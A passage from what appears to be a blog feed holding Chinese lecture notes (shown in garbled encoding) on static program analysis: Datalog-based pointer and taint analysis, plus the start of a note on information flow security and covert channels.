class="number">18</span>).</span><br></pre></td></tr></table></figure></li></ol><p>æ³¨æ„ï¼Œ<code>;</code> ä¼˜å…ˆçº§ä½äº<code>,</code>ï¼Œå¦‚ä¼˜å…ˆåš<code>;</code>éœ€åŠ <code>()</code>ã€‚</p><h3 id="Negation"><a href="#Negation" class="headerlink" title="Negation"></a>Negation</h3><p><code>!</code> è¡¨ç¤ºå–åï¼Œå¦‚ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Man(person)  &lt;- Age(person, age), age&gt;=<span class="number">18</span>, !Gender(person,<span class="string">"woman"</span>).</span><br></pre></td></tr></table></figure><h3 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h3><p>Datalog æ”¯æŒé€’å½’æ¨å¯¼ï¼Œå¦‚è®¡ç®—å›¾çš„å¯è¾¾æ€§ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reach(from,to) &lt;- Edge(from, to).</span><br><span class="line">Reach(from,to) &lt;- Reach(from, node), Reach(node, to)</span><br></pre></td></tr></table></figure><p>æ­£æ˜¯ç”±äºæ”¯æŒæ¨å¯¼ï¼Œæ‰è®©Datalogè¶³å¤Ÿå¼ºå¤§ï¼Œä»¥è‡³äºèƒ½åšå¤æ‚çš„ç¨‹åºåˆ†æã€‚</p><h3 id="Rule-Safety"><a href="#Rule-Safety" class="headerlink" title="Rule Safety"></a>Rule Safety</h3><p>è€ƒè™‘å¦‚ä¸‹ä¸¤ç§å†™æ³•ï¼š</p><ul><li><code>A(x) &lt;- B(y), x &gt; y</code></li><li><code>A(x) &lt;- B(y), !C(x,y)</code></li></ul><p>ç”±äº<code>y</code>æ²¡æœ‰èŒƒå›´é™åˆ¶ï¼Œå› æ­¤è§„åˆ™æ¨å¯¼è¿‡ç¨‹æ—¶æ— é™çš„ã€‚</p><p>Datalogä¸­è§„åˆ™éœ€è¦æ»¡è¶³å®‰å…¨æ€§ï¼ˆrule safetyï¼‰ï¼Œå³ruleä¸­æ¯ä¸ªå˜é‡è‡³å°‘å‡ºç°åœ¨ä¸€ä¸ªéåçš„ relation atom ä¸­ã€‚</p><h3 id="Recursion-and-Negation"><a href="#Recursion-and-Negation" class="headerlink" title="Recursion and Negation"></a>Recursion and Negation</h3><p>è€ƒè™‘å¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A(x) &lt;- B(x), !A(x)</span><br></pre></td></tr></table></figure><p>åŸå­é€’å½’æ¨å¯¼äº†è‡ªå·±çš„éï¼Œå› æ­¤è¯­å¥æ—¶çŸ›ç›¾çš„ï¼Œå³ä¸€ä¸ªåŸå­çš„é€’å½’å’Œå–åå¿…é¡»æ˜¯åˆ†ç¦»çš„ã€‚</p><h2 id="Excution"><a href="#Excution" class="headerlink" title="Excution"></a>Excution</h2><p>Datalogè¾“å…¥EDBå’ŒRulesï¼Œç»è¿‡Data engineä¸æ–­æ¨å¯¼ï¼Œæœ€ç»ˆäº§ç”ŸIDBã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906204334359.png" alt="image-20200906204334359"></p><p>Datalogç¨‹åºä¸€å®šä¼šåœæ­¢ï¼Œå› ä¸ºï¼š</p><ol><li>datalogæ˜¯å•è°ƒçš„â€”â€”datalogçš„factsæ— æ³•åˆ é™¤ï¼›</li><li>datalogä¸­IDBçš„è°“è¯æ˜¯æœ‰é™çš„â€”â€”è€ƒè™‘åˆ°rule safetyã€‚</li></ol><p>å¸¸ç”¨çš„Datalogå¼•æ“æœ‰ï¼š</p><p>LogicBlox, SoufflÃ©, XSB, Datomic, Flora-2, â€¦</p><h1 id="Pointer-Analysis-via-Datalog"><a href="#Pointer-Analysis-via-Datalog" class="headerlink" title="Pointer Analysis via Datalog"></a>Pointer Analysis via Datalog</h1><p>åœ¨Datalogä¸­åšæŒ‡é’ˆåˆ†ææ—¶ï¼ŒEDBä¸ºè¯­æ³•ä¸Šèƒ½ç›´æ¥è·å–çš„ä¿¡æ¯ï¼ŒIDBä¸ºæŒ‡é’ˆåˆ†æçš„ç»“æœ<br>ï¼ŒRulesä¸ºæŒ‡é’ˆåˆ†æçš„è§„åˆ™ã€‚</p><h2 id="Datalog-Model"><a href="#Datalog-Model" class="headerlink" title="Datalog Model"></a>Datalog Model</h2><p>å®šä¹‰å˜é‡é›†åˆä¸º <code>V</code>ï¼ŒåŸŸä¸º <code>F</code>ï¼Œå¯¹è±¡ä¸º <code>O</code>ã€‚</p><p>é‚£ä¹ˆEDBå¯ä»¥å®šä¹‰ä¸ºï¼š</p><div class="table-container"><table><thead><tr><th>Kind</th><th>Statement</th><th>EDB</th></tr></thead><tbody><tr><td>New</td><td>i: x = new T()</td><td><code>New(x : V, o : O)</code></td></tr><tr><td>Assign</td><td>x = y</td><td><code>Assign(x : V, y : V)</code></td></tr><tr><td>Store</td><td>x.f = y</td><td><code>Store(x : V, f : F, y : V)</code></td></tr><tr><td>Load</td><td>y = x.f</td><td><code>Load(y : V, x : V, f : F)</code></td></tr></tbody></table></div><p>å®šä¹‰IDBï¼š</p><ul><li><code>VarPointsTo(v: V, o: O)</code><br><code>VarPointsTo(x, oi)</code> è¡¨ç¤º $o_i \in pt(x)$</li><li><code>FieldPointsTo(oi: O, f: V, oj: O)</code><br><code>FieldPointsTo(oi, f, oj)</code> è¡¨ç¤º $o_j \in pt(o_i.f)$</li></ul><h2 id="Rules-1"><a href="#Rules-1" class="headerlink" title="Rules"></a>Rules</h2><p>å°†æ¨å¯¼è§„åˆ™å†™ä¸ºDatalogçš„è§„åˆ™ï¼š</p><div class="table-container"><table><thead><tr><th>Kind</th><th style="text-align:center">Statement</th><th style="text-align:center">Rule</th><th>Datalog</th></tr></thead><tbody><tr><td>New</td><td style="text-align:center">i: x = new T()</td><td style="text-align:center">$\frac{}{o_i \in pt(x)}$</td><td><code>VarPointsTo(x, o) &lt;- New(x, o).</code></td></tr><tr><td>Assign</td><td style="text-align:center">x = y</td><td style="text-align:center">$\frac{o_{i} \in p t(y)}{o_{i} \in p t(x)}$</td><td><code>VarPointsTo(x, o) &lt;- Assign(x, y), VarPointsTo(y, o).</code></td></tr><tr><td>Store</td><td style="text-align:center">x.f = y</td><td style="text-align:center">$\frac{o_i \in pt(x),\\ o_j \in pt(y)}{o_j \in pt(o_i.f)}$</td><td><code>FieldPointsTo(oi, f, oj) &lt;- Store(x, f, y), VarPointsTo(x, oi), VarPointsTo(y, oj).</code></td></tr><tr><td>Load</td><td style="text-align:center">y = x.f</td><td style="text-align:center">$\frac{o_{i} \in pt(x),\\ o_{j} \in pt\left(o_{i} . f\right)}{o_{j} \in p t(y)}$</td><td><code>VarPointsTo(y, oj) &lt;- Load(y, x, f), VarPointsTo(x, oi), FieldPointsTo(oi, f, oj).</code></td></tr></tbody></table></div><p>ä¸‹é¢ä¸¾ä¾‹è¯´æ˜</p><p>åˆå§‹é˜¶æ®µï¼Œä»ç¨‹åºä¸­æå–Newï¼ŒStoreï¼ŒAssignï¼ŒLoadè¯­å¥ä¸ºEDBï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211135591.png" alt="image-20200906211135591" style="width: 80%;"></p><p>æ¥ä¸‹æ¥å¤„ç†Newè¯­å¥ï¼Œå°†bã€cåŠ å…¥VarPointsToï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211304812.png" alt="image-20200906211304812" style="width: 80%;"></p><p>å¤„ç†Assign, ç”±$Assign(d,c), VarPointsTo(c, o_3) \rightarrow VarPointsTo(d,o_3)$ ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211352710.png" alt="image-20200906211352710" style="width: 80%;"></p><p>å¤„ç†Storeï¼Œç”± </p><p>$Store(c,f,a), VarPointsTo(c,o_3), VarPointsTo(a, o_1) \rightarrow FieldsPointsTo(o_3,f, o_1)$ï¼Œ</p><p>$Store(c,f,d), VarPointsTo(c,o_3), VarPointsTo(d, o_3) \rightarrow FieldsPointsTo(o_3,f, o_3)$ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211446132.png" alt="image-20200906211446132" style="width: 80%;"></p><p>å¤„ç†Loadï¼Œç”±</p><p>$Load(e,d,f), VarPointsTo(d,o_3), FieldPointsTo(o_3,f,o_1) \rightarrow VarPointsTo(e, o_1)$;</p><p>$Load(e,d,f), VarPointsTo(d,o_3), FieldPointsTo(o_3,f,o_3) \rightarrow VarPointsTo(e, o_3)$:</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211517749.png" alt="image-20200906211517749" style="width: 80%;"></p><p>æ³¨æ„åœ¨å®é™…è¿è¡Œæ—¶ï¼Œå½“æ–°factäº§ç”Ÿåï¼Œengine ä¼šæ£€æŸ¥å½“å‰çŠ¶æ€ï¼Œå¤„ç†èƒ½å¤Ÿæ¨å¯¼çš„rulesã€‚</p><h2 id="Handle-Method-Calls"><a href="#Handle-Method-Calls" class="headerlink" title="Handle Method Calls"></a>Handle Method Calls</h2><p>å¤„ç†å‡½æ•°è°ƒç”¨éœ€è¦æ·»åŠ æ–°çš„EDBå’ŒIDBï¼Œå¹¶ä¸”å®šä¹‰ä¸‰æ¡è§„åˆ™ï¼š</p><ol><li><p>Dispatchï¼Œä¼ thisï¼Œå»ºç«‹ä¸€ä¸ªcall graphè¾¹<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211906002.png" alt="image-20200906211906002" style="width:90%;"></p></li><li><p>ä¼ å‚æ•°ï¼Œargumentå’Œparameterè¡¨ç¤ºå®å‚å’Œå½¢å‚<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906212005590.png" alt="image-20200906212005590" style="width:90%"></p></li><li><p>ä¼ è¿”å›å€¼<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906212036419.png" alt="image-20200906212036419" style="width:90%;"></p></li></ol><p>åšå…¨ç¨‹åºæŒ‡é’ˆåˆ†ææ—¶éœ€è¦å¼•å…¥ä¸€ä¸ªå…¥å£EDBï¼Œä»¥ä¸‹ä¸ºå®Œæ•´ä»£ç <br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906212109286.png" alt="image-20200906212109286" style="width:90%;"></p><p>æ³¨æ„ï¼Œå¦‚æœmä¸å¯è¾¾ï¼Œé‚£ä¹ˆå®ƒä»¬çš„<code>VarPointsTo</code>æ°¸è¿œä¸ºç©ºï¼Œå› æ­¤å…¶ä»–æ¨å¯¼ä¸éœ€è¦åŠ <code>Reachable(m)</code>ã€‚</p><h1 id="Taint-Analysis-via-Datalog"><a href="#Taint-Analysis-via-Datalog" class="headerlink" title="Taint Analysis via Datalog"></a>Taint Analysis via Datalog</h1><p>åœ¨Datalogä¸Šåšæ±¡ç‚¹åˆ†ææ—¶ï¼Œéœ€è¦é¢å¤–å®šä¹‰ä»¥ä¸‹EDBå’ŒIDB</p><ul><li><p>EDB</p><ul><li><code>Source(m: M)</code>ï¼Œå®šä¹‰å‡½æ•° m ä¸ºsource</li><li><code>Sink(m: M)</code>ï¼Œå®šä¹‰å‡½æ•° m ä¸ºsink</li><li><code>Taint(l: S, t: T)</code>ï¼Œ taint(l,t) è¡¨ç¤ºåœ¨lè¡Œäº§ç”Ÿäº†æ±¡ç‚¹tï¼Œç”¨äºå…³è”callsiteäº§ç”Ÿçš„æ±¡ç‚¹æ•°æ®</li></ul></li><li><p>IDB</p><ul><li><code>TaintFlow(t: T, m: M)</code>ï¼Œè¡¨ç¤ºæ±¡ç‚¹<code>T</code>æµå‘<code>M</code>æ–¹æ³•</li></ul></li></ul><p>åœ¨Callè¯­å¥ä¸Šæ–°å¢å¦‚ä¸‹æ¨å¯¼ï¼š</p><ul><li><p>å¤„ç†sourceï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200907211233439.png" alt="image-20200907211233439"></p><p>å°†è¿”å›å€¼æ ‡è®°ä¸ºæ±¡ç‚¹ã€‚</p></li><li><p>å¤„ç†sinkï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200907211324230.png" alt="image-20200907211324230"></p><p>nè¡¨ç¤ºä»»æ„ä¸€ä¸ªå‚æ•°ï¼Œ<code>Taint(_,t)</code>ç”¨äºä¿è¯å‚æ•°ä¼ å…¥äº†ä¸€ä¸ªæ±¡ç‚¹æ•°æ®ã€‚</p></li></ul><h1 id="æ•°æ®æµåˆ†æ"><a href="#æ•°æ®æµåˆ†æ" class="headerlink" title="æ•°æ®æµåˆ†æ"></a>æ•°æ®æµåˆ†æ</h1><p>è®¾Vä¸ºèŠ‚ç‚¹ï¼ŒDè¡¨ç¤ºé›†åˆä¸­å…ƒç´ </p><ul><li>data(V,D) &lt;- gen(V,D)</li><li>data(V,D) &lt;- edge(Vâ€™, V), date(Vâ€™, D),  !kill(V, D) # æ³¨æ„ä¸€å®šè¦é˜²æ­¢çŸ›ç›¾</li><li>data(entry,d)</li></ul><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Datalogä½œä¸ºæ–°å…´çš„ç¨‹åºåˆ†ææ¨¡å‹ï¼Œæœ‰å¦‚ä¸‹ä¼˜ç‚¹ï¼š</p><ol><li>åˆ†æå®ç°ç®€å•ï¼›</li><li>å¯è¯»æ€§å¼ºï¼›</li><li>åˆ†ææ•ˆç‡å¯ä»¥ä»é«˜åº¦ä¼˜åŒ–Datalogå¼•æ“è·ç›Šã€‚</li></ol><p>ç„¶è€Œå®ƒçš„ä¼˜ç‚¹ä¹Ÿæ­£æ˜¯å®ƒçš„ç¼ºç‚¹ï¼š</p><ol><li>é™åˆ¶è¡¨è¾¾ï¼Œæ²¡æ³•è¡¨è¾¾ç‰¹æ®Šæƒ…å†µï¼Œå¦‚å…ˆå‰çš„gen-killï¼Œdatalogåªèƒ½é€’å¢ï¼Œåˆä¾‹å¦‚datalogå¾ˆéš¾è¡¨è¾¾æ‰€æœ‰æ¡ä»¶éƒ½æ»¡è¶³çš„æƒ…å†µï¼ˆåªèƒ½ä¸€ä¸ªä¸€ä¸ªåŠ ï¼‰ï¼›</li><li>æ•ˆç‡ä¸¥é‡ä¾èµ–å¼•æ“ï¼Œæ— æ³•å®Œå…¨æ§åˆ¶å¼•æ“æ€§èƒ½ã€‚</li></ol><p>ä¸ªäººæ„Ÿè§‰Datalogå¾ˆåƒç›®å‰æµè¡Œçš„LGTMæ€è·¯ï¼Œä½†æ˜¯ç¡®å®æ„Ÿè§‰è¡¨è¾¾ä¸æ˜¯å¾ˆè‡ªç”±ï¼Œç„¶è€Œå®ƒè¢«å¾ˆå¤šå¤§ä½¬è®¤ä¸ºæ˜¯æœªæ¥ä¸»æµçš„ç¨‹åºåˆ†ææ¡†æ¶ï¼Œè¿˜æ˜¯å€¼å¾—å­¦ä¹ çš„ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>David Maier, K. Tuncay Tekle, Michael Kifer, and David S. Warren, â€œDatalog: Concepts, History, and Outlookâ€. Chapter, 2018.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å…ˆå‰çš„åˆ†æç®—æ³•è™½ç„¶å±•ç¤ºäº†åˆ†æç»†èŠ‚ï¼Œä½†æ˜¯è¿‡äºå¤æ‚éš¾ä»¥å®ç°ï¼Œæœ¬è¯¾å°†ä»‹ç»ä¸€ç§ä¸€ç§å£°æ˜å¼è¯­è¨€ï¼ˆDatalogï¼‰ä»¥æ•°æ®é©±åŠ¨æ¨å¯¼çš„æ–¹å¼åšæŒ‡é’ˆåˆ†æå’Œæ±¡ç‚¹åˆ†æ&lt;/p&gt;&lt;h1 id=&quot;Motivation&quot;&gt;&lt;a href=&quot;#Motivation&quot; class=&quot;headerlink&quot; title=&quot;Motivation&quot;&gt;&lt;/a&gt;Motivation&lt;/h1&gt;&lt;h2 id=&quot;Imperative-vs-Declarative&quot;&gt;&lt;a href=&quot;#Imperative-vs-Declarative&quot; class=&quot;headerlink&quot; title=&quot;Imperative vs Declarative&quot;&gt;&lt;/a&gt;Imperative vs Declarative&lt;/h2&gt;&lt;p&gt;Imperativeï¼ˆå‘½ä»¤å¼ï¼‰è¯­è¨€ä¸»è¦æœ‰Javaã€C/C++ç­‰ï¼Œå±•ç¤ºäº†è¯¦ç»†çš„å®ç°ç»†èŠ‚ï¼›&lt;/p&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ±¡ç‚¹åˆ†æ" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
      <category term="æŒ‡é’ˆåˆ†æ" scheme="http://anemone.top/tags/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/"/>
    
      <category term="Datalog" scheme="http://anemone.top/tags/Datalog/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E5%AE%89%E5%85%A8%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/</id>
    <published>2020-09-05T13:22:13.000Z</published>
    <updated>2020-09-09T13:10:39.975Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨è½¯ä»¶å®‰å…¨ä¸­ï¼Œæœ€å¸¸è§çš„æ¼æ´æœ‰æ³¨å…¥ç±»æ¼æ´ï¼ˆInjectionï¼‰å’Œä¿¡æ¯æ³„éœ²ï¼ˆInformation Leakï¼‰ï¼Œè€Œæœ¬èŠ‚è¯¾å°†ä»‹ç»çš„Information Flow åˆ†ææ–¹æ³•å¯ä»¥æœ‰æ•ˆå¤„ç†ä»¥ä¸Šæ¼æ´ï¼Œå…·ä½“æ¥è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„æ±¡ç‚¹åˆ†ææŠ€æœ¯ã€‚</p><h1 id="Information-Flow-Security"><a href="#Information-Flow-Security" class="headerlink" title="Information Flow Security"></a>Information Flow Security</h1><a id="more"></a><h2 id="Information-Flow"><a href="#Information-Flow" class="headerlink" title="Information Flow"></a>Information Flow</h2><blockquote><p>Information flow: if the information in variable x is transferred to variable y, then there is information flow x â†’ y. </p></blockquote><p>ä¿¡æ¯æµ[1] æŒ‡ç¨‹åºä¸­çš„å˜é‡ä¿¡æ¯çš„æµåŠ¨ï¼Œå¦‚æœ‰è¯­å¥<code>y = x</code>ï¼Œé‚£ä¹ˆå­˜åœ¨ä¿¡æ¯æµ $x\rightarrow y$ï¼Œå¯ä»¥çœ‹å‡ºï¼Œä¿¡æ¯æµåˆ†æå¾ˆåƒå…ˆå‰çš„æŒ‡é’ˆåˆ†æã€‚</p><h2 id="Access-Control-v-s-Infomation-Flow-Security"><a href="#Access-Control-v-s-Infomation-Flow-Security" class="headerlink" title="Access Control v.s. Infomation Flow Security"></a>Access Control v.s. Infomation Flow Security</h2><ul><li><p>è®¿é—®æ§åˆ¶ç”¨äºæ£€æŸ¥ä¿¡æ¯è®¿é—®çš„æƒé™ï¼Œä½†æ˜¯æ— æ³•æ£€æŸ¥æœ‰æƒé™çš„ç”¨æˆ·åšä»€ä¹ˆ</p></li><li><p>ä¿¡æ¯æµå®‰å…¨ç”¨äºæ£€æŸ¥ç¨‹åºå¤„ç†æ•°æ®çš„å®‰å…¨æ€§ï¼Œæ˜¯ç«¯åˆ°ç«¯çš„ä¿¡æ¯å®‰å…¨</p></li></ul><p>å®é™…ç³»ç»Ÿä¸­é€šå¸¸éœ€è¦è®¿é—®æ§åˆ¶å’Œä¿¡æ¯æµæ§åˆ¶ä¸¤è€…é…åˆä½¿ç”¨ã€‚</p><h2 id="Information-Flow-Security-1"><a href="#Information-Flow-Security-1" class="headerlink" title="Information Flow Security"></a>Information Flow Security</h2><p>ä¿¡æ¯æµå®‰å…¨ä¸»è¦æœ‰ä¸¤æ­¥éª¤ï¼š</p><ol><li>å°†å˜é‡åˆ’åˆ†ä¸ºä¸åŒå®‰å…¨ç­‰çº§ï¼ˆSecurity Levelsï¼‰</li><li>å¯¹ä¸åŒç­‰çº§çš„ä¿¡æ¯æµåšä¸åŒç­–ç•¥ï¼ˆInformation Flowï¼‰</li></ol><h3 id="Security-Levels"><a href="#Security-Levels" class="headerlink" title="Security Levels"></a>Security Levels</h3><p>é€šå¸¸å¯¹ä¿¡æ¯æµåˆ†ä¸ºä¸¤çº§â€”â€”é«˜çº§ï¼ˆHï¼‰å’Œä½çº§ï¼ˆLï¼‰ï¼Œè¡¨ç¤ºç§˜å¯†å’Œå…¬å¼€ä¿¡æ¯ã€‚</p><p>Dorothy ç­‰äºº[2] æ›¾æå‡ºç”¨æ ¼è¡¨ç¤ºä¿¡æ¯æµï¼Œå³ $L\leq H$</p><p>å®é™…ä¸­ä¹Ÿå¯ä»¥æœ‰æ›´å¤šçº§ã€‚</p><h3 id="Infomation-Flow-Policy"><a href="#Infomation-Flow-Policy" class="headerlink" title="Infomation Flow Policy"></a>Infomation Flow Policy</h3><p>é«˜å¯†çº§ä¿¡æ¯ä¸èƒ½å½±å“ä½å¯†çº§ä¿¡æ¯ï¼Œå³é«˜å¯†çº§ä¸èƒ½æµå‘ä½å¯†çº§ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905193021433.png" alt="image-20200905193021433"></p><h1 id="Confidentiality-and-Integrity"><a href="#Confidentiality-and-Integrity" class="headerlink" title="Confidentiality and Integrity"></a>Confidentiality and Integrity</h1><p>ä¿å¯†æ€§ï¼ˆConfidentialityï¼‰ï¼šé˜»æ­¢ç§˜å¯†ä¿¡æ¯è¢«æ³„éœ²ï¼Œå¯ä»¥çœ‹å‡ºå…ˆå‰çš„ç­–ç•¥å°±æ˜¯ä¿è¯äº†ä¿å¯†æ€§ï¼Œä¿¡æ¯æ³„éœ²ç±»æ¼æ´å°±æ˜¯è¿åäº†ä¿å¯†æ€§ï¼›</p><p>å®Œæ•´æ€§ï¼ˆIntegrityï¼‰ï¼šä¿è¯é‡è¦ä¿¡æ¯ä¸è¢«ä¸å¯ä¿¡ä¿¡æ¯æ±¡æŸ“ï¼Œæ³¨å…¥ç±»æ¼æ´å°±æ˜¯è¿åäº†å®Œæ•´æ€§ã€‚</p><p>ä¸‹å›¾å¯ä»¥çœ‹å‡ºConfidentialityå’ŒIntegrityæ˜¯å¯¹ç§°çš„ï¼Œå¯ä»¥è§†ä¸ºä¿¡æ¯çš„è¯»å®‰å…¨å’Œå†™å®‰å…¨ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905194503470.png" alt="image-20200905194503470"></p><p>è¿™ä¹Ÿæ„å‘³ç€ï¼Œå¯ä»¥ç”¨ç›¸åŒçš„æŠ€æœ¯è§£å†³ä»¥ä¸Šä¸¤ç±»æ¼æ´ã€‚</p><h1 id="Explicit-Flow-and-Convert-Channels"><a href="#Explicit-Flow-and-Convert-Channels" class="headerlink" title="Explicit Flow and Convert Channels"></a>Explicit Flow and Convert Channels</h1><p>æ˜¾ç¤ºæµï¼ˆExplicit Flowï¼‰æŒ‡ç›´æ¥é€šè¿‡èµ‹å€¼ä¼ é€’ä¿¡æ¯çš„æµï¼Œå¦‚ï¼š</p><ul><li><code>x = y</code></li><li><code>x = y + z</code></li></ul><p>éšç§˜ä¿¡é“ï¼ˆConvert Channelsï¼‰[4]æŒ‡é€šè¿‡æ§åˆ¶æµå½±å“ä¿å¯†æ•°æ®çš„ä¿¡æ¯æµï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secret = getSecret();</span><br><span class="line"><span class="keyword">if</span> (secret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    publik = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    publik = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œæ ¹æ® <code>publik</code> æ•°æ®å¯ä»¥æ¨æµ‹ <code>secret</code> æ­£è´Ÿã€‚</p><p>é€šå¸¸æ¥è¯´ï¼Œéšç§˜ä¿¡é“æœ‰ä»¥ä¸‹è¡¨ç°å½¢å¼</p><ul><li><p>éšå¼æµï¼ˆImplicit flowsï¼‰<br><code>if (secret &lt; 0 ) p = 1; else p = 0;</code></p></li><li><p>ç»ˆæ­¢ä¿¡é“ï¼ˆTermination channelsï¼‰<br><code>while ( secret &lt; 0 ) {...};</code></p></li><li><p>æ—¶é—´ä¿¡é“ï¼ˆTiming channelsï¼‰<br><code>if ( secret &lt; 0 ) for(...) {...};</code></p></li><li><p>å¼‚å¸¸ï¼ˆExceptionsï¼‰<br><code>if ( secret &lt; 0 ) throw new Exception(&quot;...&quot;);</code></p></li></ul><p>ç„¶è€Œï¼Œéšè—ä¿¡é“æ³„éœ²æ•°æ®é‡è¾ƒå°ï¼Œä¸€èˆ¬åˆ†æè‡³é’ˆå¯¹æ˜¾ç¤ºæµã€‚</p><h1 id="Taint-Analysis"><a href="#Taint-Analysis" class="headerlink" title="Taint Analysis"></a>Taint Analysis</h1><p>æ±¡ç‚¹åˆ†æå°†æ•°æ®åˆ†ä¸ºä¸¤ç±»ï¼Œè¢«æ±¡æŸ“æ•°æ®å’Œæœªè¢«æ±¡æŸ“æ•°æ®ã€‚</p><ul><li>Sourceï¼šæ±¡ç‚¹ä¼ æ’­æºï¼Œæ±¡ç‚¹æ•°æ®å¸¸å¸¸æ˜¯ä¸€äº›å‡½æ•°çš„è¿”å›å€¼ï¼›</li><li>Sinkï¼šæ±¡ç‚¹ä¼ æ’­è‡³å…³é”®ç‚¹ï¼Œä¹Ÿå«sinkç‚¹ï¼Œå¸¸å¸¸æ˜¯æ•æ„Ÿå‡½æ•°çš„å‚æ•°ã€‚</li></ul><p>å¯¹äº Confidentialityï¼Œå¯ä»¥å…¶åšå¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li>Sourceï¼šä¿å¯†æ•°æ®</li><li>Sinkï¼šæ³„éœ²ç‚¹</li></ul><p>å¯¹äº Integrityï¼Œå¯å¯¹å…¶åšå¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li>Sourceï¼šä¸å¯ä¿¡æ•°æ®</li><li>Sinkï¼šæ•æ„Ÿå‡½æ•°</li></ul><h2 id="Taint-and-Pointer-Analysis"><a href="#Taint-and-Pointer-Analysis" class="headerlink" title="Taint and Pointer Analysis"></a>Taint and Pointer Analysis</h2><p>æ±¡ç‚¹åˆ†æä¸æŒ‡é’ˆåˆ†æéå¸¸ç±»ä¼¼ï¼Œå°†æ±¡ç‚¹åˆ†æåšå¦‚ä¸‹è°ƒæ•´ï¼Œå°±å¯ä»¥å€ŸåŠ©æŒ‡é’ˆåˆ†æåšæ±¡ç‚¹åˆ†æï¼š</p><ul><li>å°†æ±¡ç‚¹æ•°æ®ä½œä¸ºç‰¹æ®Šobjects</li><li>åœ¨allocation sitesä¸­äº§ç”Ÿsource</li><li>å€ŸåŠ©æŒ‡é’ˆåˆ†æå®Œæˆæ±¡ç‚¹åˆ†æ</li></ul><p>ä»¥ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„æŒ‡é’ˆåˆ†æä¸ºä¾‹ï¼š</p><p>é¦–å…ˆå®šä¹‰æ•°æ®æŠ½è±¡ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905202944738.png" 